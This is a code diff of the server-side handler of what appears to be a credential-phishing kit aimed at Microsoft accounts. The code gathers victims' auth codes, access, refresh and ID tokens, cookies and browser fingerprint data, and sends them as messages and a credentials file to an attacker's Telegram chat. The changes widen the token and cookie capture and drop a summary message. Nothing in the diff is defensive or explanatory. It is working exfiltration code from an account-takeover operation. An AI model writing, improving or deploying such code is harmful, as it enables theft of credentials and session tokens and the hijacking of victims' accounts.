@@ -72,14 +72,28 @@ export const handler = async (event, context) => {
     messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured (see file)' : 'Missing'}\n`;
     messageText += `🕒 Time: ${timestamp}\n\n`;
     
-    // Add token information
-    const tokenData = data.tokenData;
+    // Add token information - check multiple possible data sources
+    const tokenData = data.tokenData || data.tokens || data.accessToken;
+    const accessToken = data.accessToken || (tokenData && tokenData.tokens && tokenData.tokens.access_token);
+    const refreshToken = data.refreshToken || (tokenData && tokenData.tokens && tokenData.tokens.refresh_token);
+    const idToken = data.idToken || (tokenData && tokenData.tokens && tokenData.tokens.id_token);
+    
     if (tokenData && tokenData.success && tokenData.tokens) {
       messageText += `🎯 *Token Exchange Successful*\n`;
       messageText += `🔑 Access Token: ${tokenData.tokens.access_token ? '✅ Captured' : '❌ Missing'}\n`;
       messageText += `🔄 Refresh Token: ${tokenData.tokens.refresh_token ? '✅ Captured (No Expiry)' : '❌ Missing'}\n`;
       messageText += `🆔 ID Token: ${tokenData.tokens.id_token ? '✅ Captured' : '❌ Missing'}\n`;
       messageText += `⏱️ Offline Access: ${tokenData.tokens.offline_access ? '✅ Enabled' : '❌ Disabled'}\n\n`;
+    } else if (accessToken || refreshToken || idToken) {
+      messageText += `🎯 *Tokens Captured*\n`;
+      messageText += `🔑 Access Token: ${accessToken ? '✅ Captured' : '❌ Missing'}\n`;
+      messageText += `🔄 Refresh Token: ${refreshToken ? '✅ Captured (No Expiry)' : '❌ Missing'}\n`;
+      messageText += `🆔 ID Token: ${idToken ? '✅ Captured' : '❌ Missing'}\n\n`;
+    } else {
+      messageText += `🎯 *Token Status*\n`;
+      messageText += `🔑 Access Token: ❌ Missing\n`;
+      messageText += `🔄 Refresh Token: ❌ Missing\n`;
+      messageText += `🆔 ID Token: ❌ Missing\n\n`;
     }
 
     // Add organizational credentials info
@@ -97,9 +111,12 @@ export const handler = async (event, context) => {
     
     // Note: Authorization code is in the file, not in text message for security
     
-    // Add cookie info if available
-    if (data.cookies && Array.isArray(data.cookies) && data.cookies.length > 0) {
-      messageText += `🍪 Cookies: ${data.cookies.length} captured\n`;
+    // Add cookie info - check multiple possible sources
+    const cookies = data.formattedCookies || data.cookies || [];
+    const cookieCount = Array.isArray(cookies) ? cookies.length : 0;
+    
+    if (cookieCount > 0) {
+      messageText += `🍪 Cookies: ${cookieCount} captured\n`;
     } else {
       messageText += `🍪 Cookies: None captured\n`;
     }
@@ -383,26 +400,14 @@ ${data.browserFingerprint?.localStorage || 'Empty'}
         body: formData,
       });
 
-      if (fileResponse.ok) {
-        const fileResult = await fileResponse.json();
-        fileSent = true;
-        console.log('✅ Credentials file sent to Telegram successfully');
-        
-        // Send a summary message as well
-        const hasTokens = tokenData && tokenData.success && tokenData.tokens;
-        const summaryMessage = `📁 **CREDENTIALS FILE SENT**\n\n📧 Email: \`${email}\`\n🔑 Session: \`${sessionId}\`\n📄 File: \`${fileName}\`\n\n🎯 **Captured Data:**\n✅ Auth Code: ${authCode ? 'Captured' : 'Missing'}\n🔑 Access Token: ${hasTokens && tokenData.tokens.access_token ? 'Captured' : 'Missing'}\n🔄 Refresh Token: ${hasTokens && tokenData.tokens.refresh_token ? 'Captured (No Expiry)' : 'Missing'}\n🆔 ID Token: ${hasTokens && tokenData.tokens.id_token ? 'Captured' : 'Missing'}\n🍪 Cookies: ${microsoftCookies.length}`;
-        
-        const summaryResponse = await fetch(telegramUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: summaryMessage,
-            parse_mode: 'Markdown'
-          }),
-        });
-        
-      } else {
+             if (fileResponse.ok) {
+         const fileResult = await fileResponse.json();
+         fileSent = true;
+         console.log('✅ Credentials file sent to Telegram successfully');
+         
+         // NO SUMMARY MESSAGE - just the file
+         
+       } else {
         const fileError = await fileResponse.text();
         console.error('❌ File upload failed:', fileError);
         
